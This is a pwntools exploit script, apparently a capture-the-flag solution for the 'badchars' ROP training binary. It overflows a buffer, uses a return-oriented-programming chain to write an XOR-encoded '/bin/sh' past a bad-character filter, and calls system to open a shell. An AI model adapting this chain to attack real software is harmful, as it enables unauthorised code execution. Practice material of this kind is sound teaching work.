from pwn import *

#0x0000000000400b30 : xor byte ptr [r15], r14b ; ret
#0x0000000000400b40 : pop r14 ; pop r15 ; ret
#0x0000000000400b39 : pop rdi ; ret
#0x0000000000400b34 : mov qword ptr [r13], r12 ; ret
#0x0000000000400b3b : pop r12 ; pop r13 ; ret

bad_chars=['b', 'i', 'c', '/' ,' ','f','n','s']

CALL_SYSTEM=0x004006f0
STR_ADDR=0x00601100
SET_RDI=0x00400b39
SET_XOR_REGS = 0x00400b40
XOR_BYTES=0x00400b30
SET_REGS=0x00400b3b
WRITE_MEM=0x00400b34

xor_key=0x12

def write_str(s,addr,exp):
    #write 8 byte string with bad chars
    exp+=p64(SET_REGS)
    s=list(s)
    xored_s=[chr(ord(ch)^xor_key) if ch in bad_chars else ch for ch in s]
    exp+="".join(xored_s)
    exp+=p64(addr)
    exp+=p64(WRITE_MEM)
    for ch in s:
        if ch in bad_chars:
            exp+=p64(SET_XOR_REGS)
            exp+=chr(xor_key)+"\x00"*7
            exp+=p64(addr)
            exp+=p64(XOR_BYTES)
        addr+=1

    return exp

r=process("./badchars")
exploit=b'A'*40
exploit=write_str("/bin/sh\x00",STR_ADDR,exploit)
exploit+=p64(SET_RDI)
exploit+=p64(STR_ADDR)
exploit+=p64(CALL_SYSTEM)
r.sendline(exploit)
r.interactive()
